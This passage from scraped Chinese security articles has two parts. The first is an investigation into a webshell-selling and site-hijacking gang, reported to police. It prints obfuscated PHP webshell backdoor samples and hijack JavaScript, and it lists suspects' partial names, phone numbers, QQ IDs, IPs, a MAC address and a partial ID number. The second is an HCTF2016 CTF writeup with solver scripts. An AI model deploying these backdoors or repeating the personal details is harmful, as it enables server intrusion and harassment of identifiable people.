webshell》让老袁发给让他，以便他主动联系我。后来他果真访问了几个webshell的地址，我也抓取到了他的真实PC指纹以及代理的指纹以及QQ昵称。之后他主动找到我，问我是不是星际团队的，并说收到我发的邮件了。这时候我就很好奇了，莫非星际团队也找到他了？然后他就来恐吓我，说要抓你们（星际团队），已经调查了星际团队一年了。这时候我心一想，水真深，查来查去的到底是谁在查谁呢。不过他肯定是瞒不过我的，毕竟我有他卖shell的证据，不过意想不到的是他说：“我背后都是省厅的人，你以为这些shell都是怎么来的？都是在国家机器提取的。”我勒个去，国家会干这种事吗？国家提取网站记录我是信，isp保留日志也是1年，至于批量提取全国网站访问特征拿出来卖这我就不信了，要么就是黑客入侵到了运营商去提取出来的。经过了一些沟通后，他居然一直说我是星际团队，就把我拉黑了。后来我就主动加他说：“你是河北的吧，我已经有你犯罪证据了。”他就怕了，主动加我认怂，还发了打包好的webshell给我。这时候我又惊呆了，这简直是逆天的节奏，居然有上万个webshell和国内所有cms的后台登录密码，其中包括dedecms discuz wordpress emlog ecshop empire jieqi phpmyadmin uchome ucenter php168等几乎是全国所有cms都存在，而且每种的数量去重复都在上万条，我会上传一部分在附件。他说他背后的人的有几十万的discuz后台登录账户密码，我测试了他发我的一些后台，均可以登录，其中信息包括登录的fromhash uid 用户名、密码 、安全问题 、安全答案，而且都是前一天的。到底是什么东西能记录如此多东西而且还没有一点异常。我看到其中也有我使用过大马的很多站，里面还有上万条webshell，其中有大量我的站，还有大量各种类型的大马和不同密码，看样子并非我一个人受害，我进行特征匹配出来，大概有上百人的大马不同特征。而且他发我的只是很小一部分，叫我给他钱才给我更多。这样一想他手里的资源都有几十万条了吧。他说他后面的人是技术团队，还有各种0day，是给国家干的，手里有全国的webshell，如果真是他说的这样，那资源为什么出现在他这里了还拿出来卖？很明显是撒谎怕我查他。我不相信，决定继续调查。 经过几天的分析，这波数据和以前wooyun曝光的出来的九宫格（大家可以回溯一下2013年的http://www.dedebox.com/core/centerxxxxx.php）是一样的，我对当时的数据也进行了打包分析，发现这波shell里面还存在部分的重复数据。而当前这个大马和当时九宫格的登录参数特征基本都是在Spider PHP Shell(SPS-)这款代码的基础上修改的，也就是说除了后门本身，这伙人还通过其他渠道来提取的大量webshell，之后通过webshell去运行了记录后台数据的代码写入内存中僵死代码，保持着只要不换服务器就常年不死的状态，这也还是猜想，因为后台数据里面有些站的确是九宫格重复的，如果是九宫格后门的话我就有新方向可查了，以上是我进行的大致分析和调查过程。下面我就不描述过程，就直接提供数据记录以及取证结果，交给警方去完成了。取证以下这几个是团伙一（老袁）跳转到的域名：116305.net559160.net618309.net786077.net551809.comwww.919808.netwww.226830.com均出自同一团伙的，只是域名不同，每个站跳转到不同的域名分散风险罢了，其中劫持代码里面的ip都是一样107.182.228.74，看得出来很老练。这几个是模拟蜘蛛抓取劫持内容的bc logo图片地址的ip：210.126.27.70pic.root1111.com58.96.179.132104.202.66.226此团伙工作环境ip，都在马来西亚（时间在10月9-号到10月26号以内的）2016-10-26 13:00:01 ( IP 14.192.210.34 ) 马来西亚Windows NT 10.0, MSIE 49.0,Firefox 49.0, 1536×8642016-10-26 13:20:09 ( IP 103.6.245.143 ) 马来西亚Windows NT 10.0, MSIE 49.0,Firefox 49.0, 1536×8642016-10-26 13:00:25 ( IP 175.141.34.101 ) 马来西亚Windows NT 6.3, Chrome 50.0.2661,QQBrowser 9.5.9244, 1920×10802016-10-24 13:59:17 ( IP 175.136.41.251 ) 马来西亚Windows 7 &amp; 2008 r2, MSIE 49.0,Firefox 49.0, 1536×8642016-10-25 14:28:11 ( IP 175.143.101.241 ) 马来西亚 Windows NT 10.0, Chrome 47.0.2526, 1920×10802016-10-26 13:20:09  ( IP 103.6.245.143 ) 马来西亚Windows NT 10.0, MSIE 49.0,Firefox 49.0, 1536×86414.192.211.116  马来西亚14.192.211.223 马来西亚175.138.234.137马来西亚工作PC指纹（分析此团伙有5个人）：Windows NT 6.3, MSIE 11.0,QQBrowser 9.5.9244, 1920×1080, 224 色Windows 7 &amp; 2008 r2, MSIE 49.0,Firefox 49.0, 1536×864Windows NT 10.0, Chrome 47.0.2526, 1920×1080Windows XP, MSIE 6.0, 1126×800Windows Server 2003, Chrome 49.0.2623, 1920×1080Windows NT 10.0, MSIE 49.0,Firefox 49.0, 1536×864此团伙首领信息QQ 4743048XX 6410755XX真实姓名：袁X 重庆人手机号：159989847XX  手机MAC:18:9E:FC:11:2C:70  马来西亚手机号：0601369589XX他的网站：www.badongedu.com  www.7cq.tv(他建立的地方论坛) api.fwqadmin.com(这个是他自己正在使用的大马自己留的后门收信地址)附件会有大马样本有兴趣的可以看看Email:[email protected]&lt;script data-cfhash='f9e31' type=""text/javascript""&gt;/*  */&lt;/script&gt; [email protected]&lt;script data-cfhash='f9e31' type=""text/javascript""&gt;/*  */&lt;/script&gt;在国内的历史IP:222.178.225.146(重庆市 电信)222.178.201.12(重庆市 电信)27.11.4.19(重庆市 联通)27.10.36.56(重庆市 联通)113.204.194.202(重庆市 联通)119.84.66.14(重庆市 电信)61.161.125.77(重庆市巴南区 时代e行线网迷俱乐部李家沱店A/B馆)国内的历史PC信息：mac:90-2b-34-93-ad-73操作系统：Microsoft Windows XP显卡：NVIDIA GeForce GT 610CPU：AMD Athlon(tm) II X4 640 Processor 3325HZ团伙成员信息就没去调查了，找到他就可以了。WebShell卖家（一切安好）信息VPN代理 ：110.10.176.127  韩国2016-10-24 22:26:37 ( IP 211.110.17.189 ) 韩国（自己比特币购买的主机搭建）访问时间10月9号真实IP：2016-10-26 16:23:27 ( IP 121.18.238.18 ) 河北省保定市 上海网宿科技股份有限公司联通CDN节点 Windows NT 10.0, Chrome 47.0.2526, 1920×108027.186.126.196 河北省保定市 电信  真实ip可能性更大浏览器指纹信息 ，一共3个不同的，但应该都是同一个人，可能电脑比较多，因为他有2个QQWindows NT 6.3, Chrome 45.0.2454, 1366×768 真实指纹Windows NT 10.0, Chrome 47.0.2526, 1920×1080Windows NT 6.3, Chrome 45.0.2454, 1366×768, 224 色, 未装 Alexa 工具Windows NT 10.0, Chrome 53.0.2785, 1600×900, 224 色,QQ2436449670  3496357182Telegram：@haorenge888此人现在开的奥迪A8，真是土豪啊，看来赚了不少钱还能逍遥法外,是河北口音即河北人。如要查到webshell来源只有查他的幕后渠道。他与老袁的交易信息:。星际团伙信息使用过的域名：wokeda.cn www.98589.com www.356388.com chuan2828.com cnzzz.pw web-159.comdiyi1111.comdiyi2222.comdiyi3333.comdiyi4444.comxinyu55.comhongyihai.com80268.com5130898.com maimai789.com zhenyi58.com xwgy999.com 统计代码document.writeln(""&lt;script language=\""javascript\"" type=\""text\/javascript\"" src=\""http:\/\/js.users.51.la\/18737987.js\""&gt;&lt;\/script&gt;&lt;\/div&gt;"");            var hmt = hmt || [];            (function() {                var hm = document.createElement(""script"");                hm.src = ""//hm.baidu.com/hm.js?c1c374db31da00a022c09301920eff78"";                var s = document.getElementsByTagName(""script"")[0];                s.parentNode.insertBefore(hm, s)            })();            callJump()        }    }} if (init_flag == ""93989"") {    call_init_error()}可以通过他们网站的统计代码分析登录的记录马来西亚的ip就是真实ip搜索各大搜索引擎爬取跳转到他们的站，和快照特征，竟然有超过1000个被他们劫持过的网站，其中包括了不少全国最大的新闻网站如ifeng.com china.com.cn，如果警方需要我可以提供列表星际劫持团伙在马来西亚，成员大概6个人左右，团伙渗透的手段包括但不限于鱼叉，社工，爆破，xday，漏洞均会爬虫批量去入侵，每次入侵后喜欢留大量的后门，防止权限掉了。成员分工：二名核心技术渗透人员（其中一名主要负责攻击，入侵大型新闻类型站点。一名主要负责代码审计，以及内部一系列php的开发，包括劫持程序，外兼入侵一些中型权重站点）一名普通技术渗透（对扫描出漏洞的垃圾站点进行入侵）二名负责挂劫持代码，如果站掉了就会去恢复一名负责bc网站上的市场兼财务，收账出帐以及收站核心成员在2015年12月份从马来西亚回中国至2016年2月左右返回马来西亚以上是我通过圈内人员采取一些手段了解到的信息，因为这个团伙安全意识比较高，没得到太多真实信息，但是有一位给他们做过外包的黑客可以顺藤摸瓜星际使用过的QQ ：31XXXXXX最早的时候著名的美女黑客：YingCrackerQQ:2537789XX 9847545XX手机: 13665XXXXXX or 13665XXXXXX姓名: 江XX找到这位美女黑客去了解下此团伙的情况应该会有进展他们的后门样本：&lt;?php @$A='Acc';$p='_';$o='PO';$s='S';$t='T';$a='as';$b='sert';$Acc=$a.$b;@${$A}(${$p.$o.$s.$t}[ziiuioxs]);echo 'error';exit;?&gt;&lt;?php@$ksvSGu= ""\x73tr\x5f\x72e\x70l\x61\x63e"";@$xRec= @$ksvSGu('wcaSq','','awcaSqrrwcaSqawcaSqywcaSq_filwcaSqter');@$SOet= @$ksvSGu('wZTB','','aswZTBsewZTBrwZTBt');@$xRec((array)@$_REQUEST['rretgscr'],@$SOet);?&gt;&lt;?php if($_GET['jumpvv']){$tu=""TVFsnZG9vcnB5J"";$mzd=""10pOwoK"";$fc=""Cg"";$tnz = str_replace(""rn"","""",""rnstrnrrn_rrnernprnlrnarncrne"");$nu=""pqldmqFsKCRfUE9"";$qwb = $tnz(""u"", """", ""ubuausue6u4u_udueucoudue"");$lcq = $tnz(""j"","""",""jcrjejatej_jfujnjcjtjiojn"");$htx = $lcq('', $qwb($tnz(""q"", """", $fc.$nu.$tu.$mzd))); $htx();}?&gt;&lt;?php@$EuTsNl=""p"".""r"".""eg_r"".""epla"".""c"".""e"";@$EuTsNl(""/[email]/e"",$_POST['iiaqffg'],""error"");?&gt;&lt;?php$ad = '|';$ad .='.';$ad .='*|';$ad .='e';@preg_filter('|.*|e', $_REQUEST['andyzhengs'], '');?&gt;部分我直接复制到文件夹里面了收信地址嫌疑人信息这次事件的特征和九宫格类似，因此我对2013年的事件进行了梳理并且对这个人进行了深入调查，可以确认两个人，一定是其中一个人干的。如果不是大马的问题那么也可以从这两个人中来了解到本次后门事件的内情，唯一的不确定性就是箱子的大马看不出任何问题。因为和他们之前后门数据实在太像了，几乎概括了所有的cms，记录的后台有些也是几年前被入侵过的九宫格箱子里面的，至今还在记录着新的内容嫌疑人一：原来的吐司成员spider，也就是spider大马的创始人，当时他也留过后门，追溯起来都是2011年的事情，经过调查，那时候他所公开出去的shell大马就存在后门，而且也被他本人大量利用做游戏劫持收录挂马，传闻在2012年就赚到了几百万身价，后来就一直低调出了大众的视线，在圈子销声匿迹了。不过现在调查有新的发现，他一直在活跃着，在今年其中登录过历史邮箱，续费过后门的收信域名，因为他没办法换域名，换了就收不了shell。Id: iamspider  iamsunchao真实姓名：孙x年龄：29岁（不确定）  就读过：自贡荣县富西初级中学  户籍：成都 西昌人QQ:80937XX（真实QQ）  8622629XX（小号）历史IP（可能已经过时了）222.215.38.109(四川省内江市 电信)61.157.123.56(四川省凉山州西昌市 电信)222.215.39.131(四川省内江市 (隆昌县)电信)222.209.198.201(四川省成都市新都区 四川音乐学院附近蓝天云网吧)嫌疑人二：圈内的大神：toby57，曾经和他还打过交道，说是在给国家做事了，有点不太像是这件事的主谋，但是这个dedebox.com域名所有人就是他，而且他的能力足够干这样的事情邮�[email protected]&lt;script data-cfhash='f9e31' type=""text/javascript""&gt;/*  */&lt;/script&gt;也是他最常用的im 历史ip171.212.206.46(四川省成都市 电信)220.166.52.45(四川省绵阳市 电信)222.209.139.66(四川省成都市 电信)220.166.52.45(四川省绵阳市 电信)125.66.99.211(四川省南充市 电信)61.157.97.82(四川省绵阳市 西南科技大学)112.192.70.251(四川省南充市 联通)125.65.97.134(四川省绵阳市 电信)61.157.97.85 (四川省绵阳市 西南科技大学)182.139.60.17(四川省成都市 电信)手机号：152083414XX姓名：杨xx     身份证号：5116211989050625xx(四川省岳池县)所在城市：乐山就读过：四川省绵阳市西南科技大学结论目前其实也没什么结论，从何泄漏的全国的所有大马以及各类cms后台后门还是个谜，因为能力太菜了。。。但是我相信这个谜警方可以解开，你们赋有足够的权利和使命去完成打击。否则对网民的危害太大了，那些webshell被拿去做博彩做诈骗危害就很大了，几乎一个菠菜行业一个诈骗行业的黑帽seo源头都来于此，如果不及时阻止危害还会无限扩大。另外要去看被入侵的站点请到360搜索，娱乐场看最新一天收录https://www.so.com/s?q=%E5%A8%B1%E4%B9%90%E5%9C%BA&amp;src=srp&amp;fr=360sou_newhome&amp;adv_t=d温馨提示：使用过任何大马的帽子注意检查下自己的shell，看看里面的文件时间是否统一为最近的创建时间ps：附件为webshell部分列表，大约几千条随机copy。传送门：https://1drv.ms/u/s!AhMf1bUbIk7UanjRbtWlwOyebhU部分受害域名列表（这个基数是去重复1W多条，未去重复大概20万条，其中的信息量与附件类似，一个站会记录所有的管理员登录账户密码，包括webshell的存在）传送门：https://1drv.ms/t/s!AhMf1bUbIk7Ua72FwZXZuVMX3fw大家在拿到受害列表可以搜索下手里的webshell域名，如果存在那么就注意及时处理掉，以免被不法分子给你造成危害。","2016-11-02 15:43:30","Web安全","中国最大的Webshell后门箱子调查，所有公开大马全军覆没","http://nsoad.com/Article/web/20161102/676.html"
"5ccbfb344f2f0a0a7a69c12e","【CTF攻略】FlappyPig HCTF2016 Writeup","kong","Flip一．本题是一个linux下的qt程序。主要分成三个部分1.一个多阶Flip game2.一个三阶错乱的Flip game3.一个内存中执行的三阶Flip game,执行操作由第二个游戏的步子有关。二．第一关游戏很简单，从主对角线开始一直走对角线即可。或者爆破406035这个位置三．第二关是一个错位的Flip game所谓的错乱就是错乱了逻辑，例如一个正常的3*3 Flip逻辑为1 2 3                       1 3 24 5 6   错乱之后为   7 9 87 8 9                       4 6 5第二关最多只能有7步，超过7步就算失败所以需要遍历出第二关所有的走法所有可能如下[1, 3, 2, 9, 4, 5, 3][1, 3, 2, 9, 5, 3, 4][1, 3, 2, 9, 5, 4, 3][1, 7, 4, 9, 2, 5, 7][1, 7, 4, 9, 5, 2, 7][1, 7, 4, 9, 5, 7, 2][2, 1, 7, 4, 9, 5, 7][2, 7, 9, 4, 5, 7, 1][2, 7, 9, 5, 4, 7, 1][2, 9, 7, 4, 5, 7, 1][2, 9, 7, 5, 4, 7, 1][3, 4, 9, 2, 5, 3, 1][3, 4, 9, 5, 2, 3, 1][3, 9, 2, 5, 3, 1, 4][3, 9, 5, 2, 3, 1, 4][4, 1, 3, 2, 9, 5, 3][4, 3, 9, 2, 5, 3, 1][4, 3, 9, 5, 2, 3, 1][4, 9, 3, 2, 5, 3, 1][4, 9, 3, 5, 2, 3, 1][7, 2, 9, 4, 5, 7, 1][7, 2, 9, 5, 4, 7, 1][7, 9, 4, 5, 7, 1, 2][7, 9, 5, 4, 7, 1, 2][9, 3, 2, 5, 3, 1, 4][9, 3, 5, 2, 3, 1, 4][9, 7, 4, 5, 7, 1, 2][9, 7, 5, 4, 7, 1, 2]四．过了第二关之后出现一个flag提交窗口，submit的按钮事件位于sub_407170判断输入的长度是不是为32之后调用函数sub_406a80在sub_406a80中会根据第二关的步骤，去解码第三关的执行步骤。第二关的走法会影响后续的走法解码（因为之前是直接爆破的所及在在这里卡了很久）。第二关走的位置和对应的内存数据对应关系如下:1=&gt;0，2=&gt;2，3=&gt;1，4=&gt;6，5=&gt;8，7=&gt;3，9=&gt;4得到被分解之后的key，所谓分解就是将输入的ascii分解，成两个字节的的表示，低位放低位高位放高位。例如输入 1234Ascii  31 32 33 34分解  01 03 02 03 03 03 04 03之后会判断key的后六位最后六位为74343}然后定位到分解后的key第一位和分解后key的倒数第七位，获取以后传入sub_406780,也就是game3_flip,最后从头部和尾部往中间逼近。本题最主要的逻辑在函数sub_406780处分析后函数如下主要逻辑已经注释，就是传入a2,a3两个参数用来控制flip game的起始状态，a4是解码后的game3_steps,在game3_steps中遇到0即进行判断是否灯全灭。由于可以知道forword_char的第一位是8（h分解为08和06），那么可以推测第一步flip的初始状态为FF FF 00              00 FF 0000 00 00   或者   00 00 0000 00 00             00 00 00用之前获得的走法去解码，game3_steps打印出第一个0之前有效操作。可以看到一个符合条件的走法8310，对应的Game2_step[4, 9, 3, 5, 2, 3, 1]解码后的Game3_step8,3,1,0,9,7,5,3,1,0,9,7,2,0,9,7,2,0,8,3,1,0,4,9,0,6,1,0,4,2,5,1,0,7,6,0,4,9,0,9,7,2,0,9,7,5,3,1,0,9,7,5,3,1,0,4,9,0,5,3,6,2,0,9,7,5,3,1,0,8,3,1,0,7,5,8,4,0,5,3,6,2,0,9,7,5,3,1,0,8,6,9,5,0,8,3,1,0,5,3,6,2,0,9,7,5,3,1,0,9,7,5,3,1,0,4,9,0,6,1,0,9,7,5,3,1,0,9,7,5,3,1,0,4,9,0,6,1,0,9,7,5,3,1,0,7,6,0,8,3,1,0,9,7,2,0,9,7,2,0,7,6,0,4,9,0,6,1,0,4,2,5,1,0,8,3,1,0,7,5,8,4,0,5,3,6,2,0,9,7,2,0,8,3,1,0,7,5,8,4,0,5,3,6,2,0,9,7,5,3,1,0,8,6,9,5,0,7,5,8,4,0,9,7,2,0,9,7,5,3,1,0,7,6,0,8,3,1,0,9,7,2,0,4,2,5,1,0,9,7,5,3,1,0,7,5,8,4,0,6,1,0,9,7,5,3,1,0,7,6,0,8,3,1,0,5,3,6,2,0,9,7,5,3,1,0,9,7,5,3,1,0,9,7,5,3,1,0,6,1,0,9,7,5,3,1,0,7,6,0,4,9,0,6,1,0,9,7,5,3,1,0,8,3,1,0,9,7,5,3,1,0,6,1,0,9,7,2,0,8,3,1,0,4,9,0,6,1,0,4,2,5,1,0,7,6,0,4,9,0,9,7,2,0,9,7,5,3,1,0,8,6,9,5,0,8,3,1,0,9,7,5,3,1,0,9,7,5,3,1,0,8,6,9,5,0,4,9,0,6,1,0,9,7,2,0,7,6,0,9,7,5,3,1,0,5,3,6,2,0,4,2,5,1,0,8,3,1,0,4,9,0,5,3,6,2,0,9,7,5,3,1,0,8,3,1,0,8,3,1,0,5,3,6,2,0,9,7,5,3,1,0根据走法获得初始化矩阵：[[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 1, 0]][[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 1]][[1, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[1, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[1, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 1, 0]][[1, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 1]][[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 1, 0]][[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[1, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[1, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 1]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[1, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[1, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 1, 0]][[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 1]][[1, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[1, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[1, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 1, 0]][[0, 0, 0], [0, 0, 0], [0, 1, 0]][[1, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 1]][[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 1], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 1, 0], [0, 0, 0], [0, 0, 0]][[0, 0, 0], [0, 0, 0], [1, 0, 0]][[0, 0, 0], [0, 0, 0], [0, 0, 0]]每四个组确定两个半字节，相当于一个字节，一共104组可以获得26字节，加上前面的6字节获得全部32字节然后就是去推出，输入的forward_char和back_char了，由于限制在0f之中所以使用爆破的方式脚本如下init = [2, 0, 128, 128, 2, 6, 192, 256, 3, 6, 128, 0, 0, 6, 64, 0, 2, 4, 64, 0, 1, 2, 64, 0, 0, 6, 192, 0, 0, 6, 192, 0, 3, 2, 128, 128, 3, 6, 192, 256, 2, 4, 64, 128, 2, 4, 64, 0, 1, 4, 128, 0, 3, 2, 128, 256, 0, 4, 192, 0, 3, 2, 64, 0, 0, 0, 192, 0, 3, 6, 192, 0, 2, 0, 192, 128, 2, 6, 192, 256, 3, 6, 128, 0, 1, 2, 0, 0, 1, 6, 192, 128, 3, 0, 64, 256, 2, 6, 64, 0, 2, 2, 64, 0]key = [0,0,0,0]list1 = [0,1,6,7]list2 = [1,2,7,8]#tmp = ['h','c','t','f','{']list3 = [None]*52list3[0] = ord('h')&amp;0x0flist3[1] = (ord('h')&amp;0xF0)&gt;&gt;4list3[2] = ord('c')&amp;0x0flist3[3] = (ord('c')&amp;0xF0)&gt;&gt;4list3[4] = ord('t')&amp;0x0flist3[5] = (ord('t')&amp;0xF0)&gt;&gt;4list3[6] = ord('f')&amp;0x0flist3[7] = (ord('f')&amp;0xF0)&gt;&gt;4list3[8] = ord('{')&amp;0x0flist3[9] = (ord('{')&amp;0xF0)&gt;&gt;4    print len(init)for k in range(26):              for i in range(256):                     for l in range(4):                            z = 0                            v8 = (i&amp;0xF0)&gt;&gt;4                            if (k&lt;10):                                   v7 = list3[k]&amp;0x0F                            else :                                   v7 = (i&amp;0x0F)                            if (v7&amp;(1&lt;&lt;l)!=0):                                   z |= (1&lt;&lt;list1[l])                            if (v8&amp;(1&lt;&lt;l)!=0):                                   z |= (1&lt;&lt;list2[l])                            #print ""z="",bin(z)                            if (z==init[k*4+l]):                                   print i                                   print l                                   if (l==3):                                          print k*4+l,v8,v7                                          list3[k] = v7                                          list3[51-k] = v8                                          print ""z="",bin(z)                                          break                            else:                                    break                            if (z!=init[k*4+l]) and i==255:                                   print ""error""print list3得到结果重新编码后为Hctf{L1ttl3_f1lip_Game3_for_加上的前面的74343}最后为Hctf{L1ttl3_f1lip_Game3_for_74343}前年的400分关键位置sub_401090,用ida f5之后，整理数据可得是一个多元一次方程组的形式，写脚本把每个未知数的系数提取出来建立矩阵，判断结果也提取出来建立矩阵，交给matlab即可得到答案。Crypto So Interesting题目中t，e是关于bt的逆元，直接求出t。u 1024bit，ut是phi n的一对逆元，直接wiener attack，跑出u。ut是phi n的倍数，直接暴力跑phi n，得到phi n，解d，得到flag：bt=536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273Ln=0xea9c2c15896c2353cea7d6eeccc80ce89ca7324fdba7768ebfd10577c599b6eafaed93e719b6d69215af1c3e59d1930a71fb872ef22d28de9ffceedb854f7c10996256621d5e8941934eb284375b3b773b87ee8ded799318c8d0323e8bf98495b76336ee136a650a57fbe710666178343e77e79cb3a7d28e8c2dfba4b85105f7a381d39c163ee79246248c0402f4d9b25404a22daf5e64d0a72454649643af2d3bde001a7f127203cfc9a34bb993c3e1a532115ec53cb679e618d46832922d72f7f67e2b627c077c2f366ef7f0828a3c64895291e00b98413e6e28eca033b896703fad3bf133f34ed6e1a6fc641b33da0df745c1ecf421a058c2a7e44becf1f07fadf1eacf18810c56473e6d59a6af8221d1ae6e0547f1014018c90f175441e7efa724112a5949e6860358176ecfc4b42c0653df56ed4c52cfd44d7e02326400bcc66040bb6d7a7ed149da2eec485d9c2f84080fff045eeedbf7109aacdb4aa4e5c0c6884b57c0c86c22e934f8fc18369e19206fc52a618b892e3eb97f01d8d438bd61291823ce1d08e6af084e5a9fe528db5eead2eefa4ed3812faa48eab7aaa3430bdaa7bed31d4949391efbaadc8c57d02443388c1f028823d4fd0b9ab5548136a86974badf987369411a93c40af8d7a66d21575fdd9ef90b1ab2a1cbea1bd4b5f9ea44e081f138ffb743153f6047d63f1311d93a3f4dd0fa6791e0f881c3Le=0x1f11d804be3e294d0f537fc8c945f2b39fe27ec62a0b5d65c8b2d8fdd7e90cebd767b3d2de457cc580454e8359857bbd512e8a41124388dd0cd051c58e0db39b9f55a0d48296df58721fdff8694691436f274e6b1307a9be83b097b9cd05679f7b7a0c2689352f254bc18f1965863c77d034fc9736744a2b2da3a5fead5ce1a9691e655fb36ba12584d49f332a024f75923ec5752a49f53a097bada8de98bd0e58062c74b92d19f08aaa13f130cba42acd72c374de64b66374f099bb693d68023bc6f75be6df31d01dd182317439c2ff73bb8e3af7751a65ae7d69197f9c1764430dc9e49cb5ea5e93867a5d695626ff5fe23283ae8a758a0ba902512cd6e57061644f774200dc44b1b50402306332d3483bc8000f7aa6247fc064efc27431effe78e85fd83e2c314b0d98a40d47e6a0266e0fed9a800adab382d0fe1881130784167a3d36b1f3b3f3d2aba31c86e2c037da5a79289bbb868f6bed4d76bed0bb5a2b317d05be1b64895a9bfad508a6cd36c26510731810ef712e06df60ba09097951b1b401a84ef3feb953de7325b8a4854ca512eaf93e50baf6b1f641d559e529ce0fbbf0856658e2256d123067ae68416ac6a544475652ee28afa243566ad52ce19380f1f8f69991186ea0ec5495b646fa96702586ac24ebe614cfdd765dd3a79be12344c19ac316eea13006deef635daa2cba1b8396d854287c2b80d6dd45Lc=0xc6a7aa2373cb